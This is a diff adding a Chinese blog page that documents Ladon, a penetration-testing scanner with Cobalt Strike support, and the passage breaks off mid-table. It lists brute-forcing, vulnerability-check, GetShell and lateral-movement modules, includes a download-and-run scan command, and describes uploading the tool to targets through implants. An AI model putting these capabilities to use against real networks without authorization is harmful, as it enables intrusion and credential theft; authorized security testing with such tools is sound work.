@@ -1,0 +1,1766 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Ladon,Tool">
+
+
+<meta name="description" content="Ladon一款用于大型内网渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    〖工具〗Ladon大型内网渗透扫描器&amp;Cobalt Strike |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="〖工具〗Ladon大型内网渗透扫描器&amp;Cobalt Strike">
+            
+            〖工具〗Ladon大型内网渗透扫描器&amp;Cobalt Strike
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Ladon/">Ladon</a> <a class="category-link" href="/categories/Tool/">工具</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/Ladon/" rel="tag">Ladon</a> <a class="tag-none-link" href="/tags/Tool/" rel="tag">Tool</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2019/09/11</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                2046</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>Ladon一款用于大型内网渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。10.10.6版本内置230个功能模块…</p>
+<span id="more"></span>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-9.1-yellowgreen"></a> <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/issues"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p>
+<script language="javascript" type="text/javascript">
+setTimeout("window.location.href='http://k8gege.org/p/Ladon.html'",800);
+</script>
+<h3 id="Ladon-for-Windows">Ladon for Windows</h3>
+<p><img data-original="http://k8gege.org/k8img/Ladon/Ladon.gif"></p>
+<h3 id="Ladon-GUI">Ladon GUI</h3>
+<p><img data-original="http://k8gege.org/k8img/Ladon/LadonGUI.gif"></p>
+<h3 id="Ladon-for-Cobalt-Strike">Ladon for Cobalt Strike</h3>
+<p><img data-original="http://k8gege.org/k8img/Ladon/CS_Ladon.gif"></p>
+<h3 id="Ladon-for-PowerShell">Ladon for PowerShell</h3>
+<p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p>
+<h3 id="Python-Ladon">Python Ladon</h3>
+<p><img data-original="http://k8gege.org/k8img/Ladon//py/PyLadon.PNG"></p>
+<h3 id="Ladon-for-Linux">Ladon for Linux</h3>
+<p><img data-original="http://k8gege.org/k8img/Ladon/kali/Kali_MS17010.gif"></p>
+<h3 id="使用说明">使用说明</h3>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>主题</th>
+<th>URL</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>Ladon文档主页</td>
+<td><a href="http://k8gege.org/Ladon/">http://k8gege.org/Ladon/</a></td>
+</tr>
+<tr>
+<td>1</td>
+<td>Ladon详细文档</td>
+<td><a href="http://k8gege.org/p/Ladon.html">http://k8gege.org/p/Ladon.html</a></td>
+</tr>
+<tr>
+<td>2</td>
+<td>Ladon简明教程</td>
+<td><a href="http://k8gege.org/Ladon/example.html">http://k8gege.org/Ladon/example.html</a></td>
+</tr>
+<tr>
+<td>3</td>
+<td>基础用法详解</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/Ladon-Usage">https://github.com/k8gege/Ladon/wiki/Ladon-Usage</a></td>
+</tr>
+<tr>
+<td>4</td>
+<td>Cobalt Strike</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Aggressor">https://github.com/k8gege/Aggressor</a></td>
+</tr>
+<tr>
+<td>5</td>
+<td>Exp生成器使用</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a></td>
+</tr>
+<tr>
+<td>6</td>
+<td>高度自定义插件</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></td>
+</tr>
+<tr>
+<td>7</td>
+<td>外部模块参考</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki">https://github.com/k8gege/K8CScan/wiki</a></td>
+</tr>
+<tr>
+<td>8</td>
+<td>PowerLadon</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/powerladon">https://github.com/k8gege/powerladon</a></td>
+</tr>
+<tr>
+<td>9</td>
+<td>PythonLadon</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/PyLadon">https://github.com/k8gege/PyLadon</a></td>
+</tr>
+<tr>
+<td>10</td>
+<td>LinuxLadon</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/KaliLadon">https://github.com/k8gege/KaliLadon</a></td>
+</tr>
+<tr>
+<td>11</td>
+<td>LadonGo</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a></td>
+</tr>
+<tr>
+<td>12</td>
+<td>漏洞演示视频</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/tree/master/Video">https://github.com/k8gege/K8CScan/tree/master/Video</a></td>
+</tr>
+<tr>
+<td>13</td>
+<td>Ladon6.0文档</td>
+<td><a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a></td>
+</tr>
+<tr>
+<td>14</td>
+<td>Ladon6.2文档</td>
+<td><a href="http://k8gege.org/p/39070.html">http://k8gege.org/p/39070.html</a></td>
+</tr>
+<tr>
+<td>13</td>
+<td>Ladon6.4文档</td>
+<td><a href="http://k8gege.org/p/55476.html">http://k8gege.org/p/55476.html</a></td>
+</tr>
+<tr>
+<td>16</td>
+<td>Ladon6.5文档</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
+</tr>
+<tr>
+<td>17</td>
+<td>Ladon9.1功能</td>
+<td><a href="http://k8gege.org/Ladon/ladon91.html">http://k8gege.org/Ladon/ladon91.html</a></td>
+</tr>
+</tbody>
+</table>
+<h3 id="源码编译">源码编译</h3>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon.git">https://github.com/k8gege/Ladon.git</a><br>
+<a target="_blank" rel="noopener" href="http://xn--VS2012-gp7il2doybd3nwla034nx2nuv0bf9ip53b7h8b.net">使用VS2012或以上版本分别编译.net</a> 3.5、4.0版本EXE</p>
+<h3 id="成品下载">成品下载</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a><br>
+Win7/2008或安装.net 2.x 3.x系统可使用Ladon.exe<br>
+<a target="_blank" rel="noopener" href="http://xn--Win8-win10-zj3s124dk48i.net">Win8-win10或安装.net</a> 4.x系统可使用Ladon40.exe</p>
+<h3 id="前言">前言</h3>
+<p>无论内网还是外网渗透信息收集都是非常关键，信息收集越多越准确渗透的成功率就越高。<br>
+但成功率还受到漏洞影响，漏洞受时效性影响，对于大型内网扫描速度直接影响着成功率。<br>
+漏洞时效性1-2天，扫描内网或外网需1周时间，是否会因此错过很多或许可成功的漏洞？<br>
+对于那些拥有几百上千域名的大站来说，你发现越快成功率就越高，慢管理员就打补丁了。<br>
+因此我们需要一个支持批量C段/B段甚至A段的扫描器，添加自定义模块快速检测新出漏洞。</p>
+<h3 id="关于Ladon">关于Ladon</h3>
+<p>Ladon音译: 拉登或拉冬。因集成了很多模块，每个模块又可独立成为一个工具，和百头巨龙有很多头类似。<br>
+Ladon是希腊神话中的神兽，看守金苹果的百头巨龙。它从不睡觉，被赫拉克勒斯借扛天巨人之手诱巨龙睡着<br>
+杀死巨龙并偷得了金苹果。巨龙死前将自己的魂魄封印在金苹果中，偷盗者将金苹果送给了白雪公主，公主<br>
+为了报恩将金苹果分给了七个小矮人，吃下以后他们变成了龙珠散落到世界各地，龙珠分为七颗，它蕴含着<br>
+可以令奇迹发生的力量。当集齐7颗龙珠念出咒语，就能召唤神龙，而神龙则会实现召唤者提出的一个愿望。</p>
+<h3 id="程序简介">程序简介</h3>
+<p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。10.10.6版本内置230个功能模块,通过32种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破13种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(smbexec/wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p>
+<h3 id="使用简单">使用简单</h3>
+<p>虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手<br>
+只需一或两个参数就可用90%的功能,一个模块相当于一个新工具</p>
+<h3 id="运行环境">运行环境</h3>
+<h4 id="Windows">Windows</h4>
+<p><a target="_blank" rel="noopener" href="http://Ladon.xn--exe-e03ej1mg5h2qw6v5d.net">Ladon.exe可在安装有.net</a> 2.0及以上版本Win系统中使用(<a target="_blank" rel="noopener" href="http://xn--Win7-3k1gs84cu24cwfdlyi.net">Win7后系统自带.net</a>)<br>
+如Cmd、PowerShell、远控Cmd、WebShell等，以及Cobalt Strike内存加载使用<br>
+Ladon.ps1完美兼容win7-win10 PowerShell，不看版本可远程加载实现无文件渗透</p>
+<h4 id="Linux、Mac">Linux、Mac</h4>
+<p>安装Mono运行时,将KaliLodan改名为Ladon,通过mono执行Ladon即可。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install mono-runtime</span><br><span class="line">wget https://github.com/k8gege/Ladon/raw/master/KaliLadon -O Ladon</span><br><span class="line">mono Ladon 192.168.1.8/24 OnlinePC</span><br></pre></td></tr></tbody></table></figure>
+<p>由于mono的兼容性，不保证Mac或Linux下所有功能均可用<br>
+就对于Ladon功能的测试来看Kali的兼容性要比Ubuntu好<br>
+测试发现有些功能的稳定性以及速度没有Windows系统快<br>
+未列功能系未测试或暂不可用功能，使用前请先看说明</p>
+<p>实测：在Kali 2019下可使用功能较多，Ubuntu兼容性比不上Kali，MacOS未对所有功能进行测试</p>
+<h3 id="全平台LadonGo">全平台LadonGo</h3>
+<p>全平台：Linux、MacOS、Windows等OS<br>
+<a target="_blank" rel="noopener" href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a></p>
+<h3 id="奇葩条件">奇葩条件</h3>
+<p>实战并不那么顺利，有些内网转发后很卡或无法转发，只能将工具上传至目标<br>
+有些马可能上传两三M的程序都要半天甚至根本传不了，PY的几十M就更别想了<br>
+Ladon采用C#研发，程序体积很小500K左右，即便马不行也能上传500K程序吧<br>
+还不行也可PowerShell远程内存加载,这点是PY或GO编译的大程序无法比拟的</p>
+<h3 id="宗旨">宗旨</h3>
+<p>一条龙服务，为用户提供一个简单易用、功能丰富、高度灵活的扫描工具</p>
+<h3 id="特色">特色</h3>
+<p>扫描流量小<br>
+程序体积小<br>
+功能丰富强大<br>
+程序简单易用<br>
+插件支持多种语言<br>
+跨平台(Win/Kali/Ubuntu)等<br>
+支持Cobalt Strike插件化<br>
+支持PowerShell无文件渗透<br>
+Exp生成器可一键定制Poc<br>
+多版本适用各种环境</p>
+<h3 id="程序参数功能">程序参数功能</h3>
+<p>1  支持指定IP扫描<br>
+2  支持指定域名扫描<br>
+3  支持指定机器名扫描<br>
+4  支持指定C段扫描(ip/24)<br>
+5  支持指定B段扫描(ip/16)<br>
+6  支持指定A段扫描(ip/8)<br>
+7  支持指定URL扫描<br>
+8  支持批量IP扫描(ip.txt)<br>
+9  支持批量C段扫描(ip24.txt)<br>
+10 支持批量B段扫描(ip16.txt)<br>
+11 支持批量URL扫描(url.txt)<br>
+12 支持批量域名扫描(domain.txt)<br>
+13 支持批量机器名扫描(host.txt)<br>
+14 支持批量字符串列表(str.txt)<br>
+15 支持主机帐密列表(check.txt)<br>
+16 支持用户密码列表(userpass.txt)<br>
+17 支持指定范围C段扫描<br>
+18 支持参数加载自定义DLL（仅限C#）<br>
+19 支持参数加载自定义EXE（仅限C#）<br>
+20 支持参数加载自定义INI配置文件<br>
+21 支持参数加载自定义PowerShell<br>
+22 支持自定义程序(系统命令或第三方程序即任意语言开发的程序或脚本)<br>
+23 插件(支持多种语言C#/Delphi/Golang/Python/VC/PowerShell)<br>
+24 支持Cobalt Strike(beacon命令行下扫描目标内网或跳板扫描外网目标)<br>
+25 支持CIDR格式IP扫描,如100.64.0.0/10，192.168.1.1/20等<br>
+26 INI配置支持自定义程序密码爆破</p>
+<h3 id="内置功能模块-117">内置功能模块(117)</h3>
+<h4 id="0x001-资产扫描-11">0x001 资产扫描(11)</h4>
+<p>例子: Ladon OnlinePC(扫当前机器所处C段，其它模块同理)<br>
+例子: Ladon 192.168.1.8/24 OnlinePC</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>模块名称</th>
+<th>功能说明</th>
+<th>返回结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a href="http://k8gege.org/p/55476.html">ICMP</a></td>
+<td>存活主机扫描</td>
+<td>存活IP(探测速度很快3-6秒/C段)</td>
+</tr>
+<tr>
+<td>2</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F">OnlinePC</a></td>
+<td>存活主机扫描</td>
+<td>存活IP、Mac地址、机器名、设备制造商</td>
+</tr>
+<tr>
+<td>3</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F">OnlineIP</a></td>
+<td>仅存活主机IP</td>
+<td>存活IP</td>
+</tr>
+<tr>
+<td>4</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-C%E6%AE%B5%E5%9F%9F%E5%90%8DURL%E6%89%AB%E6%8F%8F">UrlScan</a></td>
+<td>URL域名扫描</td>
+<td>同服URL（不验证IP、域名、Web标题）</td>
+</tr>
+<tr>
+<td>5</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-C%E6%AE%B5%E6%97%81%E7%AB%99%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F">SameWeb</a></td>
+<td>同服域名扫描</td>
+<td>同服URL（验证IP、域名、Web标题）</td>
+</tr>
+<tr>
+<td>6</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F">WebScan</a></td>
+<td>Web信息扫描</td>
+<td>存活IP、主机名、Banner、Web标题</td>
+</tr>
+<tr>
+<td>7</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F">WebDir</a></td>
+<td>后台目录扫描</td>
+<td>地址、HTTP状态</td>
+</tr>
+<tr>
+<td>8</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4">SubDomain</a></td>
+<td>子域名爆破</td>
+<td>子域名 (可用DomainIP/HostIP解析)</td>
+</tr>
+<tr>
+<td>9</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD-%E6%89%B9%E9%87%8F%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90">DomainIP</a></td>
+<td>域名解析IP</td>
+<td>域名、IP</td>
+</tr>
+<tr>
+<td>10</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD-%E6%89%B9%E9%87%8F%E4%B8%BB%E6%9C%BA%E5%90%8D%E8%A7%A3%E6%9E%90">HostIP</a></td>
+<td>主机名转IP</td>
+<td>IP、域名</td>
+</tr>
+<tr>
+<td>11</td>
+<td><a href="http://k8gege.org/p/39070.html">AdiDnsDump</a></td>
+<td>域内机器信息获取(非域内请使用LdapScan探测)</td>
+<td>IP、域名</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x002-指纹识别-服务识别-17">0x002 指纹识别/服务识别(17)</h4>
+<p>例子: Ladon OsScan<br>
+例子: Ladon 192.168.1.8/24 OsScan</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>模块名称</th>
+<th>功能说明</th>
+<th>返回结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A2%E6%B5%8B">OsScan</a></td>
+<td>操作系统版本探测</td>
+<td>存活IP、工作组\机器名、操作系统、开放服务</td>
+</tr>
+<tr>
+<td>2</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB)">PortScan</a></td>
+<td>端口扫描含Banner</td>
+<td>主机名、开放端口、服务识别、Banner、Web</td>
+</tr>
+<tr>
+<td>3</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB">WhatCMS</a></td>
+<td>86种Web指纹识别</td>
+<td>URL、CMS、邮件系统、登陆页面、中间件(如Apache\Tomecat\IIS)等</td>
+</tr>
+<tr>
+<td>4</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%80%9D%E7%A7%91%E8%AE%BE%E5%A4%87%E6%89%AB%E6%8F%8F">CiscoScan</a></td>
+<td>思科设备扫描</td>
+<td>存活IP、设备型号、主机名、Boot、硬件版本</td>
+</tr>
+<tr>
+<td>5</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%9A%E4%B8%BE%E5%86%85%E7%BD%91MSSQL%E4%B8%BB%E6%9C%BA">EnumMssql</a></td>
+<td>枚举Mssql数据库主机</td>
+<td>数据库IP、机器名、SQL版本</td>
+</tr>
+<tr>
+<td>6</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%9A%E4%B8%BE%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E8%B5%84%E6%BA%90">EnumShare</a></td>
+<td>枚举网络共享资源</td>
+<td>域、存活IP、共享路径</td>
+</tr>
+<tr>
+<td>7</td>
+<td><a href="http://k8gege.org/p/39070.html">LdapScan</a></td>
+<td>不指定密码时，仅探测LDAP服务器</td>
+<td>IP是否LDAP服务器</td>
+</tr>
+<tr>
+<td>8</td>
+<td><a href="http://k8gege.org/p/39070.html">FtpScan</a></td>
+<td>不指定密码时，仅探测FTP服务器</td>
+<td>IP是否FTP服务器</td>
+</tr>
+<tr>
+<td>9</td>
+<td><a href="http://k8gege.org/Ladon/ethscan.html">EthScan</a></td>
+<td>多网卡主机探测</td>
+<td></td>
+</tr>
+<tr>
+<td>10</td>
+<td><a href="http://k8gege.org/Ladon/ntlminfo.html">SmbInfo</a></td>
+<td>SMB信息探测</td>
+<td>存活IP、机器名、Win版本、域名、DNS</td>
+</tr>
+<tr>
+<td>11</td>
+<td><a href="http://k8gege.org/Ladon/ntlminfo.html">NbtInfo</a></td>
+<td>NBT信息探测</td>
+<td>存活IP、机器名、Win版本、域名、DNS</td>
+</tr>
+<tr>
+<td>12</td>
+<td><a href="http://k8gege.org/Ladon/ntlminfo.html">WmiInfo</a></td>
+<td>WMI信息探测</td>
+<td>存活IP、机器名、Win版本、域名、DNS</td>
+</tr>
+<tr>
+<td>13</td>
+<td><a href="http://k8gege.org/Ladon/ntlminfo.html">RdpInfo</a></td>
+<td>RDP信息探测</td>
+<td>存活IP、机器名、Win版本、域名、DNS</td>
+</tr>
+<tr>
+<td>14</td>
+<td><a href="http://k8gege.org/Ladon/ntlminfo.html">WinrmInfo</a></td>
+<td>Winrm信息探测</td>
+<td>存活IP、机器名、Win版本、域名、DNS</td>
+</tr>
+<tr>
+<td>15</td>
+<td><a href="http://k8gege.org/Ladon/ntlminfo.html">MssqlInfo</a></td>
+<td>Mssql信息探测</td>
+<td>存活IP、机器名、Win版本、域名、DNS</td>
+</tr>
+<tr>
+<td>16</td>
+<td><a href="http://k8gege.org/Ladon/ntlminfo.html">ExchangeInfo</a></td>
+<td>Exchange信息探测</td>
+<td>存活IP、机器名、Win版本、域名、DNS</td>
+</tr>
+<tr>
+<td>17</td>
+<td><a href="http://k8gege.org/p/FindExchange.html"> WhatCms</a></td>
+<td>Exchange服务器探测</td>
+<td>存活IP、Exchange、Banner</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x003-口令检测-密码爆破-18">0x003 口令检测/密码爆破(18)</h4>
+<p>[自定义端口(IP:端口)、帐密检测(用户 密码)、主机帐密检测(IP 端口 数据库 用户 密码)]</p>
+<p>例子: Ladon SshScan<br>
+例子: Ladon 192.168.1.8/24 SshScan<br>
+例子: Ladon 192.168.1.8:22 SshScan (指定端口)<br>
+例子: Ladon test.rar RarScan</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>模块名称</th>
+<th>功能说明</th>
+<th>返回结果</th>
+<th>依赖</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><a href="http://k8gege.org/Ladon/SmbScan.html">SmbScan</a></td>
+<td>SMB密码爆破(Windows)</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>2</td>
+<td><a href="http://k8gege.org/Ladon/WmiScan.html">WmiScan</a></td>
+<td>Wmi密码爆破(Windowns)</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>3</td>
+<td><a href="http://k8gege.org/Ladon/NbtScan.html">NbtScan</a></td>
+<td>Ipc密码爆破(Windows)</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>4</td>
+<td><a href="http://k8gege.org/p/56393.html">LdapScan</a></td>
+<td>AD域密码爆破(Windows)</td>
+<td>检测过程、成功密码、LOG文件</td>
+<td></td>
+</tr>
+<tr>
+<td>5</td>
